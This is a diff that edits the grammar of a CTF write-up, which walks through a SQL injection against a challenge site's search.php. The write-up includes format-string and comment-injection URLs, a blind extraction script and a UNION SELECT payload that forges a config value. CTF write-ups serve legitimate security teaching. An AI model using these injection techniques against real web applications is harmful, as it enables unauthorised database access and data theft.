@@ -19,7 +19,7 @@ P.S.
 After CTF has ended, some participants shared the dirbusted source file.
 `https://owasp.ctf.intigriti.io/search.php.save`
 
-Please note, I didn't knew about this file, because dirbusting is taboo on most CTFs, if it's not stated in the challenge description. 
+Please note that I didn't know about this file, because dirbusting is generally prohibited in most CTFs, unless it is explicitly stated in the challenge description. 
 
 So I was desperately guessing every possible shit out there.
 ```php
@@ -71,19 +71,19 @@ if (isset($config['flag']) && $config['flag']){
 
 #### Fuzzing
 
-We don't see much of the possible attack vectors on the site, the only interesting thing at quick glance is search field. Which just GET's the search.php
+We don't see much of the possible attack vectors on the site, the only interesting thing at quick glance is search field. Which just GETs the search.php
 
 `https://owasp.ctf.intigriti.io/search.php?title=1`
 
-SQL injection is definetely first thing to try here, so let's try something:
+SQL injection is definitely the first thing to try here, so let's try something:
 
 `https://owasp.ctf.intigriti.io/search.php?title='"/`
 
-No errors out here what if we add another random query parameter?
+No errors are produced with this input. What if we add an another random query parameter?
 
 `https://owasp.ctf.intigriti.io/search.php?title=%27%22%2F&abacaba=123`
 
-And here we are, definetely SQL injection
+And here we are, definitely an SQL injection
 
 ```py
 Fatal error: Uncaught mysqli_sql_exception: Unknown column 'abacaba' in 'where clause' in /var/www/html/db.php:11 
@@ -91,7 +91,7 @@ Stack trace:
 #0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
 ```
 
-But after some tries we have found out that query string parameters can only contain something matching this regex `/[a-z0-9_-]/i`, dots and spaces are being replaced to underscores `_`. But since we have `-` not banned we can try to abuse it and comment query to see at least part of it in order to understand what to do next.
+After several attempts, we discovered that query string parameters must match the following regex pattern: `/[a-z0-9_-]/i`. Dots and spaces are replaced with underscores `_`. However, the `-` char is permitted, we can exploit it to comment out the rest of the query, which may reveal a portion of it and help us understand what to do next.
 
 `https://owasp.ctf.intigriti.io/search.php?b=1&1=321&--=123`
 
@@ -101,7 +101,7 @@ Stack trace:
 #0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
 ```
 
-So it adds `AND position('value' in key)` for every query parameter in reversed order. Interesting. Looks like we can try format string injection out here.
+So it adds `AND position('value' in key)` for every query parameter in reversed order. Interesting. Looks like we can try format string injection.
 
 `https://owasp.ctf.intigriti.io/search.php?a=%1$s)  AND 0;--&id=1`
 
@@ -111,12 +111,12 @@ Stack trace:
 #0 /var/www/html/db.php(11): mysqli->query('select * from o...') #1 /var/www/html/search.php(21): sqlquery('select * from o...') #2 {main} thrown in /var/www/html/db.php on line 11
 ```
 
-We were right about format string injection! Hm, looks like we need to add opening parenthesis before the format string and prefix second parameter with `in title)` in order to get something good.
+We were right about format string injection! It seems we need to prepend the format string with an opening parenthesis and prefix the second parameter with `in title)` in order to get something interesting for us.
 
 `https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) OR 0 AND POSITION(`
 
-Above payload returns empty article set, now we can extract everything.
-After some information_schema.tables iteration we've found that there's another table called flag, with column flag. Let's dump it!
+The payload above returns empty article set, now we can extract everything.
+Upon iterating over the information_schema.tables, we found an additional table called `flag`, with column `flag`. Let's dump it!
 
 ```py
 from cr3.web.brute import trie_brute
@@ -132,7 +132,7 @@ flag = trie_brute(success="<h3>", pre_request_callback=callback)
 
 And here we go, rickroll...
 
-Well, we've also found additional column in article table named `config`. Let's dump it too.
+Well, we also found an additional column in article table named `config`. Let's dump it too.
 
 ```py
 from cr3.web.brute import trie_brute
@@ -151,7 +151,7 @@ flag = trie_brute(success="<h3>", pre_request_callback=callback)
 It's JSON and there's new youtube link with another rickroll. 
 `https://www.youtube.com/watch?v=Ct6BUPvE2sM`
 
-But what happens if we'll give our own config, with something like this `{"flag":true}`?
+But what happens if we give it our own config, with something like this `{"flag":true}`?
 
 `https://owasp.ctf.intigriti.io/search.php?id=(%1$s&title=in title) UNION SELECT 1,2,3, 0x7B22666C6167223A747275657D;-- AND POSITION(`
 
